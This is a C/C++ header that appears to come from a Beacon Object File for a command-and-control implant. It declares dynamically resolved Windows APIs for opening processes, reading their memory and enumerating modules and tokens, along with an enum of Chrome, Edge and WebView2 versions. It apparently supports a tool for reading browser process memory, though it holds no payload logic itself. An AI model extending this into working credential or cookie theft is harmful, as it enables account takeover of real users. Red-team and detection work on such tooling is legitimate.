#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Shlwapi.h>

#include "base/helpers.h"

DFR(KERNEL32, GetLastError);
#define GetLastError KERNEL32$GetLastError 

DFR(KERNEL32, VirtualQueryEx)
#define VirtualQueryEx KERNEL32$VirtualQueryEx
DFR(KERNEL32, GetSystemInfo)
#define GetSystemInfo KERNEL32$GetSystemInfo

DFR(KERNEL32, OpenProcess)
#define OpenProcess KERNEL32$OpenProcess
DFR(KERNEL32, ReadProcessMemory)
#define ReadProcessMemory KERNEL32$ReadProcessMemory
DFR(KERNEL32, CloseHandle)
#define CloseHandle KERNEL32$CloseHandle

DFR(KERNEL32, FileTimeToSystemTime)
#define FileTimeToSystemTime KERNEL32$FileTimeToSystemTime

DFR(KERNEL32, LoadLibraryW)
#define LoadLibraryW KERNEL32$LoadLibraryW
DFR(KERNEL32, GetProcAddress)
#define GetProcAddress KERNEL32$GetProcAddress

DFR(KERNEL32, K32EnumProcessModulesEx)
#define K32EnumProcessModulesEx KERNEL32$K32EnumProcessModulesEx
DFR(KERNEL32, K32GetModuleBaseNameW)
#define K32GetModuleBaseNameW KERNEL32$K32GetModuleBaseNameW
DFR(KERNEL32, K32GetModuleFileNameExW)
#define K32GetModuleFileNameExW KERNEL32$K32GetModuleFileNameExW
DFR(KERNEL32, K32GetModuleInformation)
#define K32GetModuleInformation KERNEL32$K32GetModuleInformation

DFR(KERNEL32, IsWow64Process)
#define IsWow64Process KERNEL32$IsWow64Process

DFR(KERNEL32, QueryFullProcessImageNameW)
#define QueryFullProcessImageNameW KERNEL32$QueryFullProcessImageNameW

DFR(version, VerQueryValueA)
#define VerQueryValueA version$VerQueryValueA

DFR(MSVCRT, memcpy)
#define memcpy MSVCRT$memcpy
DFR(MSVCRT, malloc)
#define malloc MSVCRT$malloc
DFR(MSVCRT, free)
#define free MSVCRT$free
DFR(MSVCRT, memcmp)
#define memcmp MSVCRT$memcmp
DFR(MSVCRT, wcscmp)
#define wcscmp MSVCRT$wcscmp
DFR(MSVCRT, towlower)
#define towlower MSVCRT$towlower
DFR(MSVCRT, _wcsicmp)
#define _wcsicmp MSVCRT$_wcsicmp
DFR(MSVCRT, _stricmp);
#define _stricmp MSVCRT$_stricmp

DFR(KERNEL32, CreateToolhelp32Snapshot)
#define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot
DFR(KERNEL32, Process32FirstW)
#define Process32FirstW KERNEL32$Process32FirstW
DFR(KERNEL32, Process32NextW)
#define Process32NextW KERNEL32$Process32NextW

#pragma comment(lib,"advapi32.lib")
DFR(ADVAPI32, OpenProcessToken)
#define OpenProcessToken ADVAPI32$OpenProcessToken
DFR(ADVAPI32, GetTokenInformation)
#define GetTokenInformation ADVAPI32$GetTokenInformation
DFR(ADVAPI32, LookupAccountSidW)
#define LookupAccountSidW ADVAPI32$LookupAccountSidW

#pragma comment(lib,"version.lib")
DFR(VERSION, GetFileVersionInfoSizeW)
#define GetFileVersionInfoSizeW VERSION$GetFileVersionInfoSizeW
DFR(VERSION, GetFileVersionInfoW)
#define GetFileVersionInfoW VERSION$GetFileVersionInfoW
DFR(VERSION, VerQueryValueW)
#define VerQueryValueW VERSION$VerQueryValueW

#pragma comment(lib,"shlwapi.lib")
DFR(SHLWAPI, PathFindFileNameW)
#define PathFindFileNameW  SHLWAPI$PathFindFileNameW

//Printing stuff
#define PRINT(...) BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)
#ifdef DEBUG
#define DebugPrintErrorWithMessage(...) BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__, GetLastError())
#define DEBUG_PRINT_ERROR_MESSAGE(...) BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__, GetLastError())
#else
#define DebugPrintErrorWithMessage(...)
#define DEBUG_PRINT_ERROR_MESSAGE(...)
#endif // DEBUG
#define PrintErrorWithMessage(...) BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__, GetLastError())

//All the shared stuff
void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        byteArray[i] = static_cast<BYTE>(value & 0xFF);
        value >>= 8;
    }
}

enum TargetVersion {
    Chrome,
    Edge,
    Webview2,
    OldChrome,
    OldEdge,
    Chrome124,
    Chrome130,
    Edge130
};

struct BrowserVersion {
    WORD highMajor;
    WORD lowMajor;
    WORD highMinor;
    WORD lowMinor;
};